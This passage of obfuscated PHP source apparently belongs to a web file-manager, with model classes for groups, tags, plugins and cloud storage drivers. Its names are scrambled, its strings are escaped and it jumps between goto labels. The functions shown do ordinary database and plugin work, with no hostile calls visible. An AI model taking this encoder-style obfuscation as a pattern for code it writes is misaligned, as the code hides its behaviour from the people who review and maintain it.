$ö»«Üµ½[$úÜ¡ßƒĞ[42]]; } $ö»«Üµ½[$úÜ¡ßƒĞ[526]] = str_replace($úÜ¡ßƒĞ[529], $úÜ¡ßƒĞ[18], $¿™¢…ñ¡); } unset($ö»«Üµ½); } private function _listAppendSourceRoot(&$±ˆâ—ä, $ÎÖÃÏñ›) { $¸û×¸ºš =& $_SERVER[¹àö™Ç¾]; $éŒØ³†Ò = Model($¸û×¸ºš[817])->listSourceRoot(SourceModel::TYPE_GROUP, $ÎÖÃÏñ›); $éŒØ³†Ò = array_to_keyvalue($éŒØ³†Ò, $¸û×¸ºš[504]); $éŒØ³†Ò = array_remove_key($éŒØ³†Ò, $¸û×¸ºš[504]); foreach ($±ˆâ—ä as &$—ñÑ¨œ´) { $—ñÑ¨œ´[$¸û×¸ºš[97]] = $éŒØ³†Ò[$—ñÑ¨œ´[$¸û×¸ºš[1808]]] ? $éŒØ³†Ò[$—ñÑ¨œ´[$¸û×¸ºš[1808]]] : array(); } unset($—ñÑ¨œ´); } protected function groupMerge($Ûí¯¯ó) { $Ûí¯¯ó = array_values(array_unique($Ûí¯¯ó)); $¨üÑ®Ä¸ = array(); for ($üÅï‚Ú‘ = 0; $üÅï‚Ú‘ < count($Ûí¯¯ó); $üÅï‚Ú‘++) { $½ø†¹® = !1; for ($‘ÔÒÄšæ = 0; $‘ÔÒÄšæ < count($Ûí¯¯ó); $‘ÔÒÄšæ++) { if ($üÅï‚Ú‘ == $‘ÔÒÄšæ) { continue; } if ($this->isParentOf($Ûí¯¯ó[$‘ÔÒÄšæ], $Ûí¯¯ó[$üÅï‚Ú‘])) { $½ø†¹® = !0; break; } } if (!$½ø†¹®) { $¨üÑ®Ä¸[] = $Ûí¯¯ó[$üÅï‚Ú‘]; } } return $¨üÑ®Ä¸; } protected function isParentOf($‰«ÏÒå, $õ Ô‘øØ) { $÷çÊî =& $_SERVER[¹àö™Ç¾]; if (!$‰«ÏÒå || !$õ Ô‘øØ || $‰«ÏÒå == $õ Ô‘øØ) { return !1; } $‘âöí…½ = $this->getInfoSimple($‰«ÏÒå); $‘ñ˜—ŠÇ = $this->getInfoSimple($õ Ô‘øØ); $‰„û²Ëú = $‘âöí…½[$÷çÊî[521]] . $‰«ÏÒå . $÷çÊî[60]; if (substr($‘ñ˜—ŠÇ[$÷çÊî[521]], 0, strlen($‰„û²Ëú)) == $‰„û²Ëú) { return !0; } return !1; } public function groupShowRoot($İ¾‰´ÊÌ, $–‹Óªëç = false) { $àĞ—•†í =& $_SERVER[¹àö™Ç¾]; $â’ùŞş’ = $this->getInfo($İ¾‰´ÊÌ); if (!$â’ùŞş’) { return array(); } $™øıÚ’ï = $this->parentLevelArray($â’ùŞş’[$àĞ—•†í[521]]); $ÆÄ£¯–ı = array($İ¾‰´ÊÌ); if (count($™øıÚ’ï) == 0) { return $ÆÄ£¯–ı; } if ($–‹Óªëç && count($™øıÚ’ï) == 1) { return $ÆÄ£¯–ı; } if (!$â’ùŞş’[$àĞ—•†í[465]] || !isset($â’ùŞş’[$àĞ—•†í[465]][$àĞ—•†í[1893]]) || $â’ùŞş’[$àĞ—•†í[465]][$àĞ—•†í[1893]] == $àĞ—•†í[1862]) { return $this->groupShowRoot($™øıÚ’ï[count($™øıÚ’ï) - 1], $–‹Óªëç); } if ($â’ùŞş’[$àĞ—•†í[465]][$àĞ—•†í[1893]] == $àĞ—•†í[361]) { $Î¯¼õáÜ = explode($àĞ—•†í[60], $â’ùŞş’[$àĞ—•†í[465]][$àĞ—•†í[1894]]); if ($Î¯¼õáÜ) { $ÆÄ£¯–ı = array_merge($ÆÄ£¯–ı, $Î¯¼õáÜ); } } return $ÆÄ£¯–ı; } protected function resetParentLevel() { $é€òÌ =& $_SERVER[¹àö™Ç¾]; $º¬ÒÑµ‰ = $é€òÌ[1808]; $ì¹êÎÕ« = $this->select(); $ì¹êÎÕ« = array_to_keyvalue($ì¹êÎÕ«, $º¬ÒÑµ‰); foreach ($ì¹êÎÕ« as $Û¯ùš‡) { $Š±ıÄ¬‰ = $Û¯ùš‡; $ì”«şßş = array(); while ($Š±ıÄ¬‰[$é€òÌ[498]] != 0) { $ì”«şßş[] = $Š±ıÄ¬‰[$é€òÌ[498]]; $Š±ıÄ¬‰ = $ì¹êÎÕ«[$Š±ıÄ¬‰[$é€òÌ[498]]]; } $ì”«şßş[] = 0; $ì”«şßş = $é€òÌ[60] . implode($é€òÌ[60], array_reverse($ì”«şßş)) . $é€òÌ[60]; $this->setNamePinyin($Û¯ùš‡[$º¬ÒÑµ‰], $Û¯ùš‡[$é€òÌ[42]]); $this->where(array($º¬ÒÑµ‰ => $Û¯ùš‡[$º¬ÒÑµ‰]))->save(array($é€òÌ[584] => $ì”«şßş)); } return $ì¹êÎÕ«; } public function groupNameAuto($í„¾ªÓâ, $ÉÀØ¨»ü) { $ÄÄÖÚØ­ =& $_SERVER[¹àö™Ç¾]; $Ÿ——ış = $this->where(array($ÄÄÖÚØ­[402] => $í„¾ªÓâ))->getField($ÄÄÖÚØ­[42], !0); if (!$Ÿ——ış || !in_array($ÉÀØ¨»ü, $Ÿ——ış)) { return $ÉÀØ¨»ü; } for ($®†Ì³ƒÔ = 1; $®†Ì³ƒÔ <= count($Ÿ——ış) + 1; $®†Ì³ƒÔ++) { $Ç±€º¬ = $ÉÀØ¨»ü . "\x28{$®†Ì³ƒÔ}\51"; if (!in_array($Ç±€º¬, $Ÿ——ış)) { return $Ç±€º¬; } } } public function groupSwitch($¢¨Û§ôĞ, $—ïµµÃ) { $ù¼îª¬ê =& $_SERVER[¹àö™Ç¾]; $ÖùßöÑ = array($ù¼îª¬ê[1808] => array($ù¼îª¬ê[17], array($¢¨Û§ôĞ, $—ïµµÃ))); $‚Ò£Ê­¬ = $this->where($ÖùßöÑ)->select(); $‚Ò£Ê­¬ = array_to_keyvalue($‚Ò£Ê­¬, $ù¼îª¬ê[1808]); if (!isset($‚Ò£Ê­¬[$¢¨Û§ôĞ]) || !isset($‚Ò£Ê­¬[$—ïµµÃ]) || $‚Ò£Ê­¬[$¢¨Û§ôĞ][$ù¼îª¬ê[498]] == 0) { return !1; } $ÖùßöÑ = array($ù¼îª¬ê[1808] => $¢¨Û§ôĞ); $Ç‰¦­¢³ = Model($ù¼îª¬ê[1897])->where($ÖùßöÑ)->select(); if (!$Ç‰¦­¢³) { $Ç‰¦­¢³ = array(); } foreach ($Ç‰¦­¢³ as $Èìİ¢Æ÷) { $ª•†Èİ = $Èìİ¢Æ÷[$ù¼îª¬ê[1640]]; $ÖùßöÑ = array($ù¼îª¬ê[1640] => $ª•†Èİ, $ù¼îª¬ê[1808] => $—ïµµÃ); $çñ‡Í® = Model($ù¼îª¬ê[1897])->where($ÖùßöÑ)->find(); if (!$çñ‡Í®) { $•İŸ¿Áú = array($—ïµµÃ => $Èìİ¢Æ÷[$ù¼îª¬ê[1909]]); Model($ù¼îª¬ê[538])->userGroupAdd($ª•†Èİ, $•İŸ¿Áú); } Model($ù¼îª¬ê[538])->userGroupRemove($ª•†Èİ, $¢¨Û§ôĞ); } $ÖùßöÑ = array($ù¼îª¬ê[412] => 2, $ù¼îª¬ê[498] => 0, $ù¼îª¬ê[411] => 1, $ù¼îª¬ê[504] => array($ù¼îª¬ê[17], array($¢¨Û§ôĞ, $—ïµµÃ))); $ª²…ƒ¶é = Model($ù¼îª¬ê[817])->where($ÖùßöÑ)->field($ù¼îª¬ê[1910])->select(); $ª²…ƒ¶é = array_to_keyvalue($ª²…ƒ¶é, $ù¼îª¬ê[504], $ù¼îª¬ê[403]); $šœ®ÆÆ° = !empty($ª²…ƒ¶é[$¢¨Û§ôĞ]) ? $ª²…ƒ¶é[$¢¨Û§ôĞ] : !1; if ($šœ®ÆÆ°) { if (!$ª²…ƒ¶é[$—ïµµÃ]) { $ª²…ƒ¶é[$—ïµµÃ] = Model($ù¼îª¬ê[817])->groupRootAdd($—ïµµÃ); } $ÄÓÀôö = $ª²…ƒ¶é[$—ïµµÃ]; $ÖùßöÑ = array($ù¼îª¬ê[498] => $šœ®ÆÆ°); $ª²…ƒ¶é = Model($ù¼îª¬ê[817])->where($ÖùßöÑ)->field($ù¼îª¬ê[1911])->select(); if (!$ª²…ƒ¶é) { $ª²…ƒ¶é = array(); } Model($ù¼îª¬ê[817])->moveClearAuth = !1; foreach ($ª²…ƒ¶é as $Ø¹àÖí¾) { $™÷ÇÙé = $Ø¹àÖí¾[$ù¼îª¬ê[411]] == $ù¼îª¬ê[99] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ù¼îª¬ê[817])->move($Ø¹àÖí¾[$ù¼îª¬ê[403]], $ÄÓÀôö, $™÷ÇÙé); } Model($ù¼îª¬ê[817])->moveClearAuth = !0; $ÖùßöÑ = array($ù¼îª¬ê[412] => 2, $ù¼îª¬ê[504] => $¢¨Û§ôĞ); $ØÈø«ß½ = array($ù¼îª¬ê[504] => $—ïµµÃ); Model($ù¼îª¬ê[1912])->where($ÖùßöÑ)->save($ØÈø«ß½); Model($ù¼îª¬ê[1913])->where($ÖùßöÑ)->save($ØÈø«ß½); } $this->_changeChildLevel($‚Ò£Ê­¬[$¢¨Û§ôĞ], $‚Ò£Ê­¬[$—ïµµÃ], !0); $this->where(array($ù¼îª¬ê[498] => $¢¨Û§ôĞ))->save(array($ù¼îª¬ê[498] => $—ïµµÃ)); $this->_clearChildrenCache($‚Ò£Ê­¬[$—ïµµÃ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\145\162\137\x66\x61\x76"; protected function cacheFunctionAlias($Û·¤‡™») { $ÇÍÇÏşÍ =& $_SERVER[¹àö™Ç¾]; return array($ÇÍÇÏşÍ[1914] => array($Û·¤‡™»[0], $ÇÍÇÏşÍ[1915]), $ÇÍÇÏşÍ[1916] => array($Û·¤‡™»[0], $ÇÍÇÏşÍ[1917])); } protected function get($…Ô“³¾ì) { $å—àŞ† =& $_SERVER[¹àö™Ç¾]; $ğó–³ó = Model($å—àŞ†[522])->metaGet($…Ô“³¾ì, $å—àŞ†[1918]); $ ŠÄ±ê¡ = json_decode($ğó–³ó, !0); return $ ŠÄ±ê¡ ? $ ŠÄ±ê¡ : array($å—àŞ†[1919] => $å—àŞ†[99], $å—àŞ†[373] => array()); } protected function set($Ğ©¡ï›š, $¡…ßÀÙÚ) { $ÖßòÜİ =& $_SERVER[¹àö™Ç¾]; $¡…ßÀÙÚ = $¡…ßÀÙÚ ? $¡…ßÀÙÚ : array($ÖßòÜİ[1919] => $ÖßòÜİ[99], $ÖßòÜİ[373] => array()); Model($ÖßòÜİ[522])->metaSet($Ğ©¡ï›š, $ÖßòÜİ[1918], json_encode($¡…ßÀÙÚ)); return Model($ÖßòÜİ[522])->metaSet($Ğ©¡ï›š, $ÖßòÜİ[1918], json_encode($¡…ßÀÙÚ)); } protected function getByTagID($ê™ß¹¯ç, $‰ºßÑÃà) { $Şöï‰Ê =& $_SERVER[¹àö™Ç¾]; if (!$ê™ß¹¯ç || !$‰ºßÑÃà) { return !1; } if (!Model($Şöï‰Ê[522])->getInfoSimple($ê™ß¹¯ç)) { return !1; } $Ì¸ĞßÎ = $this->get($ê™ß¹¯ç); if (!$Ì¸ĞßÎ || !isset($Ì¸ĞßÎ[$Şöï‰Ê[373]])) { return !1; } $ê¶×¹¾ = array_find_by_field($Ì¸ĞßÎ[$Şöï‰Ê[373]], $Şöï‰Ê[401], $‰ºßÑÃà); return is_array($ê¶×¹¾) ? $ê¶×¹¾ : !1; } public function listSource($üôÆš²Ì, $»­©Çø·) { $Ä§äÍ¿œ =& $_SERVER[¹àö™Ç¾]; if ($»­©Çø· && !is_array($»­©Çø·)) { $»­©Çø· = array($»­©Çø·); } $Ñ¶ºÉ¬ = $this->listData($üôÆš²Ì); $äÇÛ‹û = array(); foreach ($Ñ¶ºÉ¬ as $É¸ êÑÀ) { $ËüªÁ®¥ = $É¸ êÑÀ[$Ä§äÍ¿œ[88]]; if (!$ËüªÁ®¥) { continue; } if (!isset($äÇÛ‹û[$ËüªÁ®¥])) { $äÇÛ‹û[$ËüªÁ®¥] = array(); } $äÇÛ‹û[$ËüªÁ®¥][] = $É¸ êÑÀ[$Ä§äÍ¿œ[427]]; } $‡²ğ´¯’ = array(); foreach ($äÇÛ‹û as $ØßÚ¡Ô§ => $‡—ŠÎ°‡) { $Áòâ¨¶ñ = !0; if (!$»­©Çø·) { $‡²ğ´¯’[] = $ØßÚ¡Ô§; continue; } foreach ($»­©Çø· as $®È¸øò) { if (!in_array($®È¸øò, $‡—ŠÎ°‡)) { $Áòâ¨¶ñ = !1; break; } } if ($Áòâ¨¶ñ) { $‡²ğ´¯’[] = $ØßÚ¡Ô§; } } if (!$‡²ğ´¯’) { return array(); } $Åå¥ = array($Ä§äÍ¿œ[418] => array($Ä§äÍ¿œ[419], $‡²ğ´¯’), $Ä§äÍ¿œ[504] => $üôÆš²Ì, $Ä§äÍ¿œ[412] => SourceModel::TYPE_GROUP); $îÄ»çú = Model($Ä§äÍ¿œ[1310])->listSource($Åå¥); if (!$îÄ»çú || count($‡²ğ´¯’) == $îÄ»çú[$Ä§äÍ¿œ[370]][$Ä§äÍ¿œ[371]]) { return $îÄ»çú; } $Ÿ¢÷Á¢Ú = array(); $ŒÏÕè²Ö = array_to_keyvalue($îÄ»çú[$Ä§äÍ¿œ[87]], $Ä§äÍ¿œ[22], $Ä§äÍ¿œ[403]); $ãÍú—Ô = array_to_keyvalue($îÄ»çú[$Ä§äÍ¿œ[86]], $Ä§äÍ¿œ[22], $Ä§äÍ¿œ[403]); $»ß¬õ† = array_merge($ãÍú—Ô, $ŒÏÕè²Ö); foreach ($‡²ğ´¯’ as $ËüªÁ®¥) { if (!in_array($ËüªÁ®¥, $»ß¬õ†)) { $Ÿ¢÷Á¢Ú[] = $ËüªÁ®¥; } } if ($Ÿ¢÷Á¢Ú) { $this->removeBySource($üôÆš²Ì, $Ÿ¢÷Á¢Ú); } return $îÄ»çú; } protected function listData($áëŠÓâ«) { $¯İÖò°Ô =& $_SERVER[¹àö™Ç¾]; $Ê·¡øì† = array($¯İÖò°Ô[1631] => 0, $¯İÖò°Ô[483] => array($¯İÖò°Ô[1920], 0), $¯İÖò°Ô[423] => $¯İÖò°Ô[1921] . $áëŠÓâ«); $èî®Úêæ = $¯İÖò°Ô[1922]; $şèı«ˆ = $this->field($èî®Úêæ)->where($Ê·¡øì†)->order($¯İÖò°Ô[1923])->select(); return $şèı«ˆ ? $şèı«ˆ : array(); } protected function addToTag($¹¾ÄÏ…, $š‡Ÿãîê, $£²’Ê›Â) { $ğ‡¹âûÜ =& $_SERVER[¹àö™Ç¾]; if (!$this->getByTagID($¹¾ÄÏ…, $£²’Ê›Â) || !$š‡Ÿãîê) { return !1; } if (!Model($ğ‡¹âûÜ[817])->pathInfo($š‡Ÿãîê)) { return !1; } $Ñ¯á¿Îû = array($ğ‡¹âûÜ[1631] => 0, $ğ‡¹âûÜ[483] => $£²’Ê›Â, $ğ‡¹âûÜ[422] => $š‡Ÿãîê, $ğ‡¹âûÜ[423] => $ğ‡¹âûÜ[1924] . $¹¾ÄÏ…, $ğ‡¹âûÜ[421] => $ğ‡¹âûÜ[22], $ğ‡¹âûÜ[1812] => 0); if ($this->where($Ñ¯á¿Îû)->find()) { return !1; } return $this->add($Ñ¯á¿Îû); } protected function removeFromTag($øÖŞÔ½, $»–ä‹»‰, $£‰¹·‹Ú) { $óå¢ï  =& $_SERVER[¹àö™Ç¾]; if (!$this->getByTagID($øÖŞÔ½, $£‰¹·‹Ú) || !$»–ä‹»‰) { return !1; } if (is_array($»–ä‹»‰)) { $»–ä‹»‰ = array($óå¢ï [17], $»–ä‹»‰); } $µ“ûıˆŒ = array($óå¢ï [1631] => 0, $óå¢ï [483] => $£‰¹·‹Ú, $óå¢ï [423] => $óå¢ï [1924] . $øÖŞÔ½, $óå¢ï [422] => $»–ä‹»‰); return $this->where($µ“ûıˆŒ)->delete(); } protected function removeByTag($½ÓºŒàŞ, $òâŠ™½) { $é¸Ü££‹ =& $_SERVER[¹àö™Ç¾]; if (!$this->getByTagID($½ÓºŒàŞ, $òâŠ™½)) { return !1; } $ÂÎí’Øµ = array($é¸Ü££‹[1631] => 0, $é¸Ü££‹[483] => $òâŠ™½, $é¸Ü££‹[423] => $é¸Ü££‹[1924] . $½ÓºŒàŞ); return $this->where($ÂÎí’Øµ)->delete(); } protected function removeBySource($ñÜ¤ ’è, $ç¼¦äá) { $ğ‚şÑ£÷ =& $_SERVER[¹àö™Ç¾]; if (!$ñÜ¤ ’è || !$ç¼¦äá) { return !1; } if (is_array($ç¼¦äá)) { $ç¼¦äá = array($ğ‚şÑ£÷[17], $ç¼¦äá); } $°ËöÒ ş = array($ğ‚şÑ£÷[1631] => 0, $ğ‚şÑ£÷[422] => $ç¼¦äá, $ğ‚şÑ£÷[483] => array($ğ‚şÑ£÷[999], 0), $ğ‚şÑ£÷[423] => $ğ‚şÑ£÷[1924] . $ñÜ¤ ’è); return $this->where($°ËöÒ ş)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\160\x6c\165\147\151\156\114\x69\163\164"; public $field = array("\x6e\141\155\145", "\x73\164\x61\164\x75\x73", "\162\x65\x67\151\145\163\164", "\x63\157\x6e\x66\x69\147"); public function loadList($ÂÜ¯©• = false) { $Ò€æ§Ö = array_to_keyvalue($this->listData(), $_SERVER[¹àö™Ç¾][42]); if ($ÂÜ¯©•) { return $Ò€æ§Ö[$ÂÜ¯©•]; } return $Ò€æ§Ö; } public function init() { $•ÒŸ´óÀ =& $_SERVER[¹àö™Ç¾]; Hook::trigger($•ÒŸ´óÀ[1925]); $¬•ÌÅ„› = $this->loadPluginList(); foreach ($¬•ÌÅ„› as $¸à±Ü€ => $‰ƒ¿ ·¤) { $æ¾Áø¾• = $this->appAllow($¸à±Ü€, $‰ƒ¿ ·¤); if (!$æ¾Áø¾•) { continue; } foreach ($‰ƒ¿ ·¤[$•ÒŸ´óÀ[1926]] as $’‹£ºø => $¨×”ğ”œ) { Hook::bind($’‹£ºø, $¨×”ğ”œ); } } Hook::trigger($•ÒŸ´óÀ[1927]); Hook::trigger(ACTION); } public function appAllow($Å§¸ıÅÜ, $ºŒšæíñ, $Å…°×´Ç = true) { $ˆ…¶•ÌÑ =& $_SERVER[¹àö™Ç¾]; $ß´±ëÏ = PLUGIN_DIR . $Å§¸ıÅÜ . $ˆ…¶•ÌÑ[1928]; if (!is_array($ºŒšæíñ) || !is_array($ºŒšæíñ[$ˆ…¶•ÌÑ[1926]]) || $ºŒšæíñ[$ˆ…¶•ÌÑ[742]] != 1 || !is_file($ß´±ëÏ)) { return !1; } if ($GLOBALS[$ˆ…¶•ÌÑ[505]] == 1) { return !0; } if ($Å…°×´Ç && !Action($ˆ…¶•ÌÑ[1929])->checkAuth($Å§¸ıÅÜ)) { return !1; } return !0; } public function unInstall($ÄËÔ—¡Ç) { $ü®·ñÕ× =& $_SERVER[¹àö™Ç¾]; $ş¯«¯ÂÆ = $this->loadList($ÄËÔ—¡Ç); if (file_exists(PLUGIN_DIR . $ÄËÔ—¡Ç)) { Hook::apply($ÄËÔ—¡Ç . $ü®·ñÕ×[1930]); } $this->remove($ş¯«¯ÂÆ[$ü®·ñÕ×[401]]); } public function changeStatus($Íøª¿Ì´, $¡ø¶¿°°) { $÷ò…‡¹¿ =& $_SERVER[¹àö™Ç¾]; $ŠÉÕÍÉ = $this->loadList($Íøª¿Ì´); if ($¡ø¶¿°°) { Hook::apply($Íøª¿Ì´ . $÷ò…‡¹¿[1931]); } $this->update($ŠÉÕÍÉ[$÷ò…‡¹¿[401]], array($÷ò…‡¹¿[1932] => $¡ø¶¿°°)); } public function appRegist($¡•òĞÜ, $ˆ‚Øğ±) { $Ü¸Ú¨” =& $_SERVER[¹àö™Ç¾]; $ì‚ÄÜ­å = $this->loadList($¡•òĞÜ); if ($ì‚ÄÜ­å) { $this->update($ì‚ÄÜ­å[$Ü¸Ú¨”[401]], array($Ü¸Ú¨”[1926] => $ˆ‚Øğ±)); } else { $èÆö×¶– = array($Ü¸Ú¨”[42] => $¡•òĞÜ, $Ü¸Ú¨”[1926] => $ˆ‚Øğ±, $Ü¸Ú¨”[742] => 0, $Ü¸Ú¨”[16] => $this->getConfigDefault($¡•òĞÜ)); $this->insert($èÆö×¶–); } } public function getConfigDefault($«÷ªŸÖ¹) { $Ñ¡ÙÈ× =& $_SERVER[¹àö™Ç¾]; $Ååãç¥ä = array(); $ŸÀ¯¨‹ = $this->getPackageJson($«÷ªŸÖ¹); if (!$ŸÀ¯¨‹ && is_array($ŸÀ¯¨‹[$Ñ¡ÙÈ×[1933]])) { return $Ååãç¥ä; } foreach ($ŸÀ¯¨‹[$Ñ¡ÙÈ×[1933]] as $ƒèÈññˆ => $”ÙÄË—ª) { if (!isset($”ÙÄË—ª[$Ñ¡ÙÈ×[378]]) || isset($Ååãç¥ä[$ƒèÈññˆ])) { continue; } $Ååãç¥ä[$ƒèÈññˆ] = $”ÙÄË—ª[$Ñ¡ÙÈ×[378]]; } return $Ååãç¥ä; } public function getPackageJson($Ï‰õ»ËÆ) { return Hook::apply($Ï‰õ»ËÆ . $_SERVER[¹àö™Ç¾][1934]); } public function getConfig($Î¢Œ¼Ÿæ, $¨²·Ô–— = false) { $£¥³’¥õ =& $_SERVER[¹àö™Ç¾]; $¢õø¥îı = array(); $µÜ¸±€¶ = $this->loadList($Î¢Œ¼Ÿæ); if ($µÜ¸±€¶ && is_array($µÜ¸±€¶[$£¥³’¥õ[16]])) { $¢õø¥îı = $µÜ¸±€¶[$£¥³’¥õ[16]]; } if (!$¢õø¥îı || $¨²·Ô–—) { $¢õø¥îı = $this->getConfigDefault($Î¢Œ¼Ÿæ); } return $¢õø¥îı; } public function setConfig($ŸæÌÚßÕ, $ãö¶ì¡À = false) { $Œ…²£¨Ó =& $_SERVER[¹àö™Ç¾]; $í€ù°¢¼ = $this->loadList($ŸæÌÚßÕ); if (!$í€ù°¢¼) { return !1; } $¬¸í‰úå = $í€ù°¢¼[$Œ…²£¨Ó[16]]; if ($ãö¶ì¡À == !1) { $¬¸í‰úå = array(); $ãö¶ì¡À = $this->getConfigDefault($ŸæÌÚßÕ); } foreach ($ãö¶ì¡À as $Ç¨ôÅª¨ => $‘Šì¼ä) { $¬¸í‰úå[$Ç¨ôÅª¨] = is_string($‘Šì¼ä) ? trim($‘Šì¼ä) : $‘Šì¼ä; } $this->update($í€ù°¢¼[$Œ…²£¨Ó[401]], array($Œ…²£¨Ó[16] => $¬¸í‰úå)); } public function viewList() { $”û”òûõ =& $_SERVER[¹àö™Ç¾]; $Ûù±µ§¤ = $this->loadList(); $this->pluginScan($Ûù±µ§¤); $Ûù±µ§¤ = $this->loadPluginList(); $ô¬ªÃ = array(); foreach ($Ûù±µ§¤ as $û¾•™º => $Ã»€‹‹) { unset($Ã»€‹‹[$”û”òûõ[1926]], $Ã»€‹‹[$”û”òûõ[16]]); $×ëÚä¾ó = PLUGIN_DIR . $Ã»€‹‹[$”û”òûõ[42]] . $”û”òûõ[1928]; if (!is_file($×ëÚä¾ó)) { continue; } $åãêĞŠ = Hook::apply($Ã»€‹‹[$”û”òûõ[42]] . $”û”òûõ[1934]); if (is_array($åãêĞŠ)) { $ô¬ªÃ[$û¾•™º] = array_merge($Ã»€‹‹, $åãêĞŠ); } } return $ô¬ªÃ; } private function loadPluginList() { $»Ô¥—æş =& $_SERVER[¹àö™Ç¾]; $Å˜ŒÇ = $this->loadList(); if (strtolower(MOD) == $»Ô¥—æş[1935]) { return $Å˜ŒÇ; } $ğîÄ˜× = Hook::trigger($»Ô¥—æş[1936], $Å˜ŒÇ); if ($Å˜ŒÇ && !$ğîÄ˜×) { die; } return $ğîÄ˜× ? $ğîÄ˜× : $Å˜ŒÇ; } private function pluginScan($şÉëÓš) { $¿ë°ó· =& $_SERVER[¹àö™Ç¾]; recursion_dir(PLUGIN_DIR, $È¥¥Ù÷‹, $™”¬Şñ‡, 0); foreach ($È¥¥Ù÷‹ as $®­çÜÁÁ) { $ô¾†Œ¬ = get_path_this($®­çÜÁÁ); if (isset($şÉëÓš[$ô¾†Œ¬]) || !file_exists($®­çÜÁÁ . $¿ë°ó·[1937]) || !file_exists($®­çÜÁÁ . $¿ë°ó·[1928])) { continue; } Hook::apply($ô¾†Œ¬ . $¿ë°ó·[1931]); } } } goto e‡„‹³ó¤Â; a‚÷£Û°ÁË: class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\162\x2e\164\141\147\x4c\151\x73\164"; public $modelType = "\x55\x73\145\x72\x4f\x70\x74\151\x6f\156"; public $field = array("\x6e\141\155\145", "\163\164\171\154\145", "\163\157\162\164"); public function listData($«¼¦¨¦ˆ = false, $í éì¡ = "\163\157\x72\x74", $ãêÜºÛœ = false) { return parent::listData($«¼¦¨¦ˆ, $í éì¡, $ãêÜºÛœ); } public function remove($³¬„é½) { return parent::remove($³¬„é½); } public function add($éÒÑ¯û×, $àÚ²Â¶û = "\x6c\x61\142\x65\x6c\55\147\162\x65\171\55\156\x6f\162\155\x61\x6c") { $Á¢ÑÍ…¤ =& $_SERVER[¹àö™Ç¾]; if ($this->findByName($éÒÑ¯û×)) { return !1; } $Õí²éÕÂ = array($Á¢ÑÍ…¤[421] => $éÒÑ¯û×, $Á¢ÑÍ…¤[484] => $àÚ²Â¶û, $Á¢ÑÍ…¤[1812] => $this->getSort($Á¢ÑÍ…¤[262]) + 1); return parent::insert($Õí²éÕÂ); } public function update($àÃ¼Â§Ç, $Ø£Î©îÃ) { $¨ÚõêÚô =& $_SERVER[¹àö™Ç¾]; $ÇœòµÔÏ = $this->listData($àÃ¼Â§Ç); $É…Òöˆ€ = $this->findByName($Ø£Î©îÃ[$¨ÚõêÚô[42]]); if (!$ÇœòµÔÏ || $É…Òöˆ€ && $É…Òöˆ€[$¨ÚõêÚô[401]] != $ÇœòµÔÏ[$¨ÚõêÚô[401]]) { return !1; } return parent::update($àÃ¼Â§Ç, $Ø£Î©îÃ); } public function moveTop($ÎŞÀÙü) { $ëûå€ĞÄ =& $_SERVER[¹àö™Ç¾]; $…ÀÖÒ˜ = parent::listData(); $Î…ö³ñî = $this->getSort($ëûå€ĞÄ[261]); foreach ($…ÀÖÒ˜ as &$ˆõ—¦Áõ) { if ($ˆõ—¦Áõ[$ëûå€ĞÄ[401]] == $ÎŞÀÙü) { $ˆõ—¦Áõ[$ëûå€ĞÄ[1831]] = $Î…ö³ñî; continue; } $ˆõ—¦Áõ[$ëûå€ĞÄ[1831]] += 1; } unset($ˆõ—¦Áõ); return parent::resetData($…ÀÖÒ˜); } public function moveBottom($óÂøë¥) { $úäšúüÓ =& $_SERVER[¹àö™Ç¾]; $¥üÒ¤Ïï = $this->getSort($úäšúüÓ[262]) + 1; return parent::update($óÂøë¥, array($úäšúüÓ[1831] => $¥üÒ¤Ïï)); } public function resetSort($Œ«”ãûó) { $–¥¹¦¥ç =& $_SERVER[¹àö™Ç¾]; $Ñ»¾ÕÊ¢ = array(); $Œ«”ãûó = is_array($Œ«”ãûó) ? $Œ«”ãûó : array(); for ($éÉïõ•È = 0; $éÉïõ•È < count($Œ«”ãûó); $éÉïõ•È++) { $Ñ»¾ÕÊ¢[$Œ«”ãûó[$éÉïõ•È] . $–¥¹¦¥ç[22]] = $éÉïõ•È + 1; } $…ˆÍàº = parent::listData(); foreach ($…ˆÍàº as &$‹ìÖÄœğ) { $Ïøë†“ = $Ñ»¾ÕÊ¢[$‹ìÖÄœğ[$–¥¹¦¥ç[401]]]; $‹ìÖÄœğ[$–¥¹¦¥ç[1831]] = $Ïøë†“ ? $Ïøë†“ : $‹ìÖÄœğ[$–¥¹¦¥ç[1831]]; } unset($‹ìÖÄœğ); return parent::resetData($…ˆÍàº); } private function getSort($Ÿ¯ßÂ®‹) { $³¼î’¹‡ =& $_SERVER[¹àö™Ç¾]; $Õ›Õ†£ = parent::listData(); $š•§ÕÆ = array_to_keyvalue($Õ›Õ†£, $³¼î’¹‡[22], $³¼î’¹‡[1831]); if (!$š•§ÕÆ) { $š•§ÕÆ = array(0); } $§€°ô‡É = $Ÿ¯ßÂ®‹ == $³¼î’¹‡[262] ? max($š•§ÕÆ) : min($š•§ÕÆ); return intval($§€°ô‡É); } } goto D³Â‘ìöÃÚ; EŒ  Ö‡«: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ Á«Ãìå) { parent::__construct($ Á«Ãìå); $this->signatureVersion($_SERVER[¹àö™Ç¾][221]); } public function fileOutLink($Âšãº®Ä) { $·õªª‹§ =& $_SERVER[¹àö™Ç¾]; if (substr($Âšãº®Ä, 0, 7) == $·õªª‹§[1308]) { $Âšãº®Ä = $·õªª‹§[1309] . substr($Âšãº®Ä, 7); } header($·õªª‹§[168] . $Âšãº®Ä); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($ŒÄ§ïæ’) { parent::__construct(); include_once SDK_DIR . $_SERVER[¹àö™Ç¾][1365]; $this->_init($ŒÄ§ïæ’); } public function _init($â³¦ø÷ß) { $¤’¹³ï =& $_SERVER[¹àö™Ç¾]; foreach ($â³¦ø÷ß as $ù™ƒñù• => $ıªè—”ğ) { if (isset($this->{$ù™ƒñù•})) { $this->{$ù™ƒñù•} = $ıªè—”ğ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¤’¹³ï[1366] . LNG($¤’¹³ï[1367])); } $this->client = new 